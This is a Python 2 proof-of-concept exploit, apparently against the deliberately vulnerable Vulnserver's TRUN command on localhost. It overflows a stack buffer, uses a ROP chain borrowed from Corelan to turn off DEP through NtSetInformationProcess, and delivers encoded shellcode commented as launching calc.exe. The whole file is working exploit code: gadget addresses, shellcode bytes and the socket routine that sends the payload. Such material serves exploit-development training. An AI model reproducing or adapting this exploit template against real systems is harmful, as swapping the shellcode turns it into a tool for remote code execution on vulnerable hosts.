#!/usr/bin/python
#  Tested on Window XP sp3
import socket,struct,sys
server = '127.0.0.1'
sport = 9999
def create_rop_chain():
    # ROP CHAIN BORROWED FROM CORELAN.BE
	#http://webcache.googleusercontent.com/search?q=cache:lo8hE6w1KWAJ:https://www.corelan.be/index.php/security/corelan-ropdb/+&cd=2&hl=en&ct=clnk&gl=pk
    rop_gadgets = [
      0x77e25c1f, # POP EAX # RETN
	  0x77dd1404, # * &NtSetInformationProcess
	  0x77dfd448, # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN 04 
	  0xffffffff, # (EBP)
	  0x77e18a5f, # INC EBP # RETN (set EBP to 0)
	  0x41414141, # junk (compensate)
	  0x77e01143, # XOR EBP,EAX # RETN	
	  0x77e25c1f, # POP EAX # RETN 
	  0xffffffde, # -> 0x22 -> EDX
	  0x77dd9b16, # NEG EAX # RETN 
	  0x77df563a, # XCHG EAX,EBX # RETN 
	  0x77de97ac, # MOV EDX,EBX # POP ESI # POP EBX # RETN 10 
	  0x77e3cb79, # RETN -> ESI
	  0xffffffff, # -> EBX
	  0x77ddbf44, # POP ECX # RETN 
	  0x41414141, # compensate
	  0x41414141, # compensate
	  0x41414141, # compensate
	  0x41414141, # compensate
	  0x77e4b1fc, # ptr to 0x02
	  0x77e25c1f, # POP EAX # RETN
	  0xfffffffc, # -> 0x4
	  0x77dd9b16, # NEG EAX # RETN
	  0x77e3cb78, # POP EDI # RETN	
	  0x77e3cb79, # RETN
	  0x77de75ed, # PUSHAD # DEC EBX # MOV EBX,33C233F6 # RETN 
	      ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()

#RUNS CALC.EXE
shell=("\xd9\xc5\xd9\x74\x24\xf4\xbe\xc1\x9a\xec\x97\x5a\x29\xc9\xb1"
"\x33\x31\x72\x17\x03\x72\x17\x83\x2b\x66\x0e\x62\x57\x7f\x46"
"\x8d\xa7\x80\x39\x07\x42\xb1\x6b\x73\x07\xe0\xbb\xf7\x45\x09"
"\x37\x55\x7d\x9a\x35\x72\x72\x2b\xf3\xa4\xbd\xac\x35\x69\x11"
"\x6e\x57\x15\x6b\xa3\xb7\x24\xa4\xb6\xb6\x61\xd8\x39\xea\x3a"
"\x97\xe8\x1b\x4e\xe5\x30\x1d\x80\x62\x08\x65\xa5\xb4\xfd\xdf"
"\xa4\xe4\xae\x54\xee\x1c\xc4\x33\xcf\x1d\x09\x20\x33\x54\x26"
"\x93\xc7\x67\xee\xed\x28\x56\xce\xa2\x16\x57\xc3\xbb\x5f\x5f"
"\x3c\xce\xab\x9c\xc1\xc9\x6f\xdf\x1d\x5f\x72\x47\xd5\xc7\x56"
"\x76\x3a\x91\x1d\x74\xf7\xd5\x7a\x98\x06\x39\xf1\xa4\x83\xbc"
"\xd6\x2d\xd7\x9a\xf2\x76\x83\x83\xa3\xd2\x62\xbb\xb4\xba\xdb"
"\x19\xbe\x28\x0f\x1b\x9d\x26\xce\xa9\x9b\x0f\xd0\xb1\xa3\x3f"
"\xb9\x80\x28\xd0\xbe\x1c\xfb\x95\x31\x57\xa6\xbf\xd9\x3e\x32"
"\x82\x87\xc0\xe8\xc0\xb1\x42\x19\xb8\x45\x5a\x68\xbd\x02\xdc"
"\x80\xcf\x1b\x89\xa6\x7c\x1b\x98\xc4\xe3\x8f\x40\x25\x86\x37"
"\xe2\x39");
prefix = 'A' * 2006
eip = '\xaf\x11\x50\x62'
nopsled = '\x90' * 16
brk = '\xcc'
padding = 'F' * (3000 - 2006 - len(rop_chain) - 16 - 1)
attack = prefix + rop_chain + nopsled + shell + padding

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)
print "Sending attack to TRUN . with length ", len(attack)
s.send(('TRUN .' + attack + '\r\n'))
print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
s.close()